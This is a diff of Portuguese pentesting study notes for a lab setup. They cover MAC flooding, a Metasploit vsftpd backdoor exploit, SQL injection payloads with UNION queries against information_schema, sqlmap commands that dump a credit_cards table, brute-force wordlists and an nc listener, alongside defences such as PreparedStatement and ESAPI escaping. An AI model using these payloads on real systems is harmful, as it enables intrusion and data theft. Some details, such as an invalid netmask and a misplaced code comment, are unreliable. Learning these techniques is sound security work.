@@ -11,7 +11,7 @@ $ netstat           => ver netstat --help
 
 =========== kali-linux ==================================================================================================================
 $ macof -i eth0     => O comando macof, se refere a overflow de endereços mac. É preciso informar em que interface ( -i) esse ataque será realizado. No nosso caso, temos a eth0, a placa de rede que está conectada ao switch no programa de emulação. Ao dar enter, ele começará a mandar uma infinidade de endereços para o switch, a fim de lotar a memória e fazer com que ele trabalhe como um switch, podendo assim pegarmos informações de pacotes com o wireshark
-$ arp -a            => Ver quais endereços MAC estão salvou para serem usados pelo ARP
+$ arp -a            => Ver quais endereços MAC estão salvos para serem usados pelo ARP
 =========================================================================================================================================
 
 =========== iptables ====================================================================================================================
@@ -446,16 +446,68 @@ Canais de Wifi:
         $ nmap -A [IP do servidor]
         $ nmap -A -T4 -Pn 192.168.0.8      => Exibe todas as portas e quais processos elas estão rodando
         Ver: https://nmap.org/docs.html
-!Kali Linux o Metasploit:
+!Metasploit:
       * O Projeto Metasploit é um projeto de segurança de computadores que fornece informações sobre vulnerabilidades de segurança e ajuda em testes de penetração e desenvolvimento de assinaturas IDS. É propriedade da Rapid7, empresa de segurança sediada em Boston, Massachusetts.
         $ use <exploit>  => ex:  exploit/unix/ftp/vsftpd_234_backdoor
         $ set RHOST [IP do servidor]
         $ exploit
 !Nessus:
       * Nessus Cloud é um programa de verificação de falhas/vulnerabilidades de segurança. Ele é composto por um cliente e servidor, sendo que o scan propriamente dito é feito pelo servidor.
+!SQL Injection:
+      * Inserir códigos SQL em parâmetros da página, para que o banco de dados se comporte de uma maneira indevida, podendo por exemplo, extrair dados que estão lá inseridos.
+      * No exemplo de nossa aplicação, os parâmetros username e password são encaminhados para o servidor e ocorre uma consulta no banco de dados para verificar se esses dados estão presentes. Essa consulta ao banco de dados é feita na linguagem SQL (Structured Query Language) e ao inserir códigos SQL nos campos username e password, estamos passando para o banco informações para que ele se comporte da forma que queremos, o que não deveria ser permitido.
+        $ no campo de password digitar  x' or 'a'='a   nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Desta forma, ao passarmos "SELECT username FROM accounts WHERE username='admin' AND password='x' or 'a'='a';", podemos utilizar esse operador lógico or para que o SQL retorne como True essa requisição
+        $ Nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Para que possamos descobrir a senha, podemos ordenar duas colunas passando no name: " admin' order by 1,2 --[espaço] " (-- comenta o código, então ' AND password=''; será comentado). Assim nos é retornado a senha do usuário. Com isso podemos também descobrir o número de colunas que essa tabela possui, basta dar um order by [num_coluna] até que não levante excessão de erro
+        ! O information schema seria um banco de dados interno capaz de referenciar os demais bancos presentes em minha aplicação, podendo informar nomes de colunas e tabelas. Sendo assim muito importante para descobrir que informações estão guardadas.
+        $ Com a linha acima descobrimos o número de colunas. Com isso, SELECT username FROM accounts WHERE username='admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ' AND password=''. O que passamos na aba username foi "admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ", Recebemos as informações de que Username está na coluna número 2, Password na número 3 e Signature na 4. Repare que esses números surgem dos parâmetros que nós mesmos inserimos. Falta descobrir qual o banco em que essa tabela Accounts está inserida. Portanto, nós vamos substituir um desses valores que aparece na tela pelo database. Agora: "admin' UNION SELECT 1,database(),3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ".
+          Ou seja, temos o nome da banco no qual a tabela está inserida, o nowasp! Então, já temos a tabela e o banco. Agora, fica ainda mais fácil descobrir as colunas de Account. No lugar do database() nós vamos colocar columns_name e após o table vamos inserir table schema='nowasp'e com isso, estamos dizendo: queremos saber o nome das colunas que estão na tabela Accounts dentro do banco nowasp. Então, "admin' UNION SELECT 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='accounts' and table_schema='nowasp'-- '". Ou seja! Temos todos os nomes das colunas! Conseguimos descobrir quais eram as sete colunas dentro da tabela!
+      *Sqlmap: Sqlmap é uma ferramenta open source para teste de penetração que automatiza o processo de detecção e exploração de vulnerabilidades de Injeção de SQL, permitindo a invasão de banco de dados de sites.
+        $ sqlmap -u "URL_DO_FORMS"   => Testa várias injeções e retorna se encontrou alguma vunerabilidade
+        $ sqlmap -u "URL_DO_FORMS" --current-db         => retorna o banco de dados usado
+        $ sqlmap -u "URL_DO_FORMS" --tables -D nowasp   => Uma vez que descobrimos qual o banco, podemos obter o número de tabelas que ele possui e o nome delas
+        $ sqlmap -u "URL_DO_FORMS" --dump -T credit_cards -D nowasp => Vai tentar retornar o conteúdo da tabela informada
+        $ 
+        $ 
+      * Para evitarmos SQL Injection temos o exemplo do seguinte códigos em Java Script:       O desenvolvedor deve separar os parâmetros que são enviados pelo usuário, da query que está indo ao banco de dados, através por exemplo, do uso da classe PreparedStatement em Java. 
+        $ String usuario=request.getParameter("usuario");
+        $ String senha=request.getParameter("senha");
+        ! Observe, na primeira String nós temos a requisição do usuário e na segunda a da senha. Uma vez com esses valores é preciso separá-los para não estarem vinculados a query dirigida ao banco, pois, é justamente esse o ponto que deixou o sistema tão frágil
+        $ String sql = "Insert into accounts (username.password) values (?,?)";
+        ! Dessa maneira, os parâmetros estão diretamente inseridos na query enviada ao banco. Assim, o desenvolvedor não verifica o que está sendo enviado e já sabemos que isso pode incorrer em um problema bastante grave! Por exemplo, dados de cartões de crédito facilmente disponíveis a um hacker.
+        $ PreparedStatement stmt = connection.prepareStatement(sql);
+        ! Fazendo uma simples verificação é possível evitar um grande problema. Utilizando o PreparedStatement do java conseguimos separar os parâmetros que o usuário passa nos campos usuário e senha, conforme mostrado abaixo
+        $ stmt.setString(1,usuario);
+        $ stmt.setString(2,senha);
+        $ stmt.execute();
+        -> Caso eu não consiga a simulação em modo bridge do meu kali e o servidor que estão no VirtualBox fazer:
+        Colocar ambos como rede interna  (no meu caso o roteador não está atuando corretamente como dhcp)
+        No kali: > ifconfig eth0 down 
+                 > ifconfig eth0 192.168.10.10 netmask 255.253.255.0 up
+        No server:
+                 > ifconfig eth0 down 
+                 > ifconfig eth0 192.168.10.20 netmask 255.255.255.0 up
+!Brut force attack:
+     * Burp Suite é um software desenvolvido em Java pela PortSwigger, para a realização de testes de segurança em aplicações web. O Burp Suite é dividido em diversos componentes.
+       $ locate /wordlists                 => listas de palavras mais comuns utilizadas em senhas e nicknames (já vem por padrão no Kali Linux) 
+       $ cewl "<URL>" -d <Nº DE PÁGINAS>   => Faz uma busca em um site e cria uma lista de palavras chaves com base nele
+       $ cewl "http://192.168.1.37/multilidae/" -d 1 -w cewl.txt => colocar a saída em arquivo txt que pode ser carregada no burp suite
+       ! Uma das formas mais usadas contra esse tipo de ataque seria obrigar o usuário a cadastrar senhas com um formato mais complexo (ex: uso de letras maiúsculas e minúsculas, caracteres especiais, tamanho mínimo, etc), bem como limitar o número de tentativas de acesso por um mesmo usuário. Desta forma, evitamos que um usuário mal intencionado, utilize de listas pré-existentes para se logar no sistema.
+!Cross Site Scripting (XSS):
+     * De acordo com a OWASP, os ataques XSS Persistent são aqueles onde os scripts são armazenados permanentemente no back-end. A vítima então recebe esse script ao realizar o acesso a página.
+       $ nc -lvp 80   =>  Net catch, responsável por abrir portas, ele ficará escutando as informações que trafegam nessa porta. Utilizando o Kali Linux, abrimos o terminal e nele vamos usar o net catch (nc). O nc deve escutar (-l) e mostrar (v) a porta (p) de número 80.
+       $ 
+       $ 
+       ! De acordo com a OWASP, uma das formas de prevenir o ataque de Cross Site Scripting (XSS) seria de realizar o escaping de elementos HTML prevenindo assim que seja interpretado como um contexto de execução. Por exemplo em Java, a OWASP possui uma biblioteca (ESAPI) que auxilia nessas questões.
+       ! Poderíamos colocar em nossa programação no back-end: String encoding=ESAPI.encoder().encodeForJavaScript(); Dessa forma, se colocarmos: <script>, através do escaping teremos a conversão desses elementos html para seus respectivos códigos: &ltscript&gt
+
 =========================================================================================================================================
 
         $ 
         $ 
         $  
+
+https://www.offensive-security.com/pwk-oscp/
+https://www.offensive-security.com/web200-oswa/
+https://solyd.com.br/treinamentos/pentest-profissional-v2022/
+
 
